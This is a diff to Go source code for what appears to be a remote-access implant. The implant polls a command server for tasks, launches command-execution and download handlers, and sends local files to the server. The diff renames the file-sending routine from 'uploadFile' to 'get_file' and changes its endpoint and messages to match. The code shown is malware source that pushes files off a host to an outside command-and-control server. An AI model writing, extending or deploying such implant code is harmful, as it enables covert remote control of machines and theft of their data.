@@ -200,8 +200,8 @@ func checkIn() {
 		go handle_runCommand(post.TaskID, post.Arg)
 	case "download":
 		go handle_download(post.TaskID, post.Arg)
-	case "upload":
-		go uploadFile(post.TaskID, post.Arg)
+	case "get-file":
+		go get_file(post.TaskID, post.Arg)
 	default:
 		// Well if it doesn't match 🤷‍♀️
 
@@ -324,7 +324,7 @@ func handle_download(this_taskID string, args string) {
 
 }
 
-func uploadFile(this_taskID string, filepath string) error {
+func get_file(this_taskID string, filepath string) error {
 
 	if _, err := os.Stat(filepath); errors.Is(err, os.ErrNotExist) {
 		// path/to/whatever does not exist
@@ -366,7 +366,7 @@ func uploadFile(this_taskID string, filepath string) error {
 	}
 
 	// Create a new request with the multipart body
-	req, err := http.NewRequest("POST", command_server+"/upload", body)
+	req, err := http.NewRequest("POST", command_server+"/get_file", body)
 	if err != nil {
 
 		fmt.Println("Can't creatr a new request")
@@ -391,20 +391,20 @@ func uploadFile(this_taskID string, filepath string) error {
 		body, err := ioutil.ReadAll(resp.Body)
 		if err != nil {
 
-			// fmt.Println("failed to upload file " + string(resp.StatusCode))
+			// fmt.Println("failed to get-file file " + string(resp.StatusCode))
 			fmt.Println(resp.StatusCode)
 
-			response := Task_Response{this_taskID, "Failed", "failed to upload file " + string(resp.StatusCode)}
+			response := Task_Response{this_taskID, "Failed", "failed to get file " + string(resp.StatusCode)}
 			send_response(response)
-			return fmt.Errorf("Failed to upload file. Status code: %d", resp.StatusCode)
+			return fmt.Errorf("Failed to get file. Status code: %d", resp.StatusCode)
 
 		}
 
 		fmt.Println(resp.StatusCode)
 
-		response := Task_Response{this_taskID, "Failed", "failed to upload file " + string(resp.StatusCode)}
+		response := Task_Response{this_taskID, "Failed", "failed to get file " + string(resp.StatusCode)}
 		send_response(response)
-		return fmt.Errorf("Failed to upload file. Status code: %d. Response body: %s", resp.StatusCode, string(body))
+		return fmt.Errorf("Failed to get file. Status code: %d. Response body: %s", resp.StatusCode, string(body))
 	}
 
 	response := Task_Response{this_taskID, "Success", "File retrieved"}
